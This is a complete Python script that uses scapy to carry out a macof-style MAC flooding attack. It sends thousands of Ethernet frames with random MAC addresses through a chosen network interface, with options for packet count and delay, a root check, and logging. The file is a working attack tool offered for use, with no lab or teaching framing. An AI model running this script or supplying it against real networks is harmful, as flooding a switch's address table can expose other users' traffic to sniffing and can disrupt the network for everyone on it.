from scapy.all import Ether, sendp, get_if_list
import random
import time
import os
import sys
import threading
import logging

# Configure logging
logging.basicConfig(filename='macof_attack.log', level=logging.INFO, format='%(asctime)s %(message)s')

# Function to generate a random MAC address
def random_mac():
    return ":".join([f"{random.randint(0x00, 0xFF):02x}" for _ in range(6)])

# Function to check for root privileges
def check_root():
    if os.geteuid() != 0:
        sys.exit("[-] This script must be run as root. Try using sudo.")

# Function to get list of available network interfaces
def list_interfaces():
    print("[*] Available interfaces:")
    for iface in get_if_list():
        print(f" - {iface}")

# Function to simulate a MAC flooding attack (MACOF-like)
def macof_attack(interface, packet_count=10000, delay=0.001):
    logging.info(f"Starting MAC flooding attack on {interface} with {packet_count} packets.")
    print(f"[+] Starting MAC flooding attack on interface {interface}...")
    for i in range(packet_count):
        src_mac = random_mac()
        dst_mac = random_mac()
        ether_frame = Ether(src=src_mac, dst=dst_mac)
        sendp(ether_frame, iface=interface, verbose=False)

        if i % 1000 == 0:
            print(f"[*] Sent {i} packets...")
            logging.info(f"Sent {i} packets.")

        time.sleep(delay)

    logging.info("MAC flooding attack finished.")
    print("[+] Attack finished.")

# Function to run the attack in a separate thread
def threaded_attack(interface, packet_count, delay):
    thread = threading.Thread(target=macof_attack, args=(interface, packet_count, delay))
    thread.start()
    thread.join()

# Entry point of the program
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="MACOF-like MAC flooding attack script")
    parser.add_argument("-i", "--interface", help="Interface to send packets on")
    parser.add_argument("-c", "--count", type=int, default=10000, help="Number of packets to send (default: 10000)")
    parser.add_argument("-d", "--delay", type=float, default=0.001, help="Delay between packets in seconds (default: 0.001)")
    parser.add_argument("-l", "--list", action="store_true", help="List all available interfaces")
    args = parser.parse_args()

    check_root()

    if args.list:
        list_interfaces()
        sys.exit()

    if not args.interface:
        sys.exit("[-] Please specify a network interface using -i or --interface.")

    threaded_attack(args.interface, args.count, args.delay)
